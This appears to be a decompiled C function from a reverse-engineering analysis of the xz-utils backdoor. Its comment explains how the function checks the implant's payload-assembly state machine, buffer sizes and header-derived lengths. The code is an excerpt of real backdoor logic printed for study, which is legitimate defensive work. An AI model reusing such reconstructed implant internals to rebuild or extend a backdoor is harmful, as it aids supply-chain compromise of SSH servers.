// /home/kali/xzre-ghidra/xzregh/107EA0_check_backdoor_state.c
// Function: check_backdoor_state @ 0x107EA0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall check_backdoor_state(global_context_t * ctx)


/*
 * AutoDoc: Enforces the payload assembly state machine kept in `global_context_t`: states 1 and 2 require a populated
 * `sshd_payload_ctx`, at least 0xae bytes buffered, and a sane body_length lifted from the decrypted header (including
 * room for the 0x60-byte trailer). State 0 insists that the staging buffer stays smaller than 0xae bytes, while state 3/4
 * accept only those literal values. Any mismatch resets `payload_state` to 0xffffffff so the caller knows to discard
 * partially buffered data.
 */

#include "xzre_types.h"

BOOL check_backdoor_state(global_context_t *ctx)

{
  u32 uVar1;
  ulong uVar2;
  BOOL state_in_expected_range;
  BOOL state_matches_exact;
  sshd_payload_ctx_t *payload_ctx;
  u32 payload_length;
  
  if (ctx == (global_context_t *)0x0) {
    return FALSE;
  }
  uVar1 = ctx->payload_state;
  if ((int)uVar1 < 3) {
    if (0 < (int)uVar1) {
      if ((((ushort *)ctx->sshd_payload_ctx != (ushort *)0x0) && (0xad < ctx->current_data_size)) &&
         (uVar2 = (ulong)*(ushort *)ctx->sshd_payload_ctx, ctx->current_data_size <= uVar2)) {
        if (uVar2 <= uVar2 + 0x60) {
          uVar2 = uVar2 + 0x60;
        }
        if (uVar2 <= ctx->payload_data_size) {
          return TRUE;
        }
      }
      goto LAB_00107f11;
    }
    if (uVar1 != 0) goto LAB_00107f11;
    state_in_expected_range = ctx->current_data_size < 0xae;
    state_matches_exact = ctx->current_data_size == 0xae;
  }
  else {
    state_in_expected_range = uVar1 == 3;
    state_matches_exact = uVar1 == 4;
  }
  if (state_in_expected_range || state_matches_exact) {
    return TRUE;
  }
LAB_00107f11:
  ctx->payload_state = 0xffffffff;
  return FALSE;
}

